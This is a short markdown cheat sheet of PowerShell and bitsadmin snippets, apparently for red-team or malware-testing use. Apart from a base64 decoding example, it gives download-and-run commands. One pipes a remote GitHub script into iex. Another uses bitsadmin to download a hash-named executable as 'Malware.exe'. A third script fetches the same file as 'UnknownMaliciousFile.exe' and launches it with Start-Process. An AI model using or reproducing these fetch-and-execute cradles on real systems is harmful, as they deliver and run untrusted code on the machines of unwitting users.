# Powershell script:

cd C:\Windows\System32\WindowsPowerShell\v1.0
powershell.exe

## command example
```shell
$DecodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SSB0cmllZCBzbyBoYXJkIGFuZCBnb3Qgc28gZmFyLg=="))
$DecodedText
```
## ScriptDownloader

```shell
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/master/HackTip/WhiteListTestScript.ps1')

bitsadmin /transfer techday /download /priority normal https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/HackTip/159d55a9e2eb957ce2326f4f46ceb54b72aeef5251299f0029ee5ac05366aad3.exe C:\Users\ITRI\Desktop\Malware.exe
```

## FileDownloader
```shell
#script example
cd C:\Users\Public\Downloads

$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/HackTip/159d55a9e2eb957ce2326f4f46ceb54b72aeef5251299f0029ee5ac05366aad3.exe'
$output = "UnknownMaliciousFile.exe"
$start_time = Get-Date

[ Net.ServicePointManager ]::SecurityProtocol  = [Net.SecurityProtocolType]::Tls12 

wget $url -outfile $output

Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"

Start-Process -FilePath "UnknownMaliciousFile.exe"
```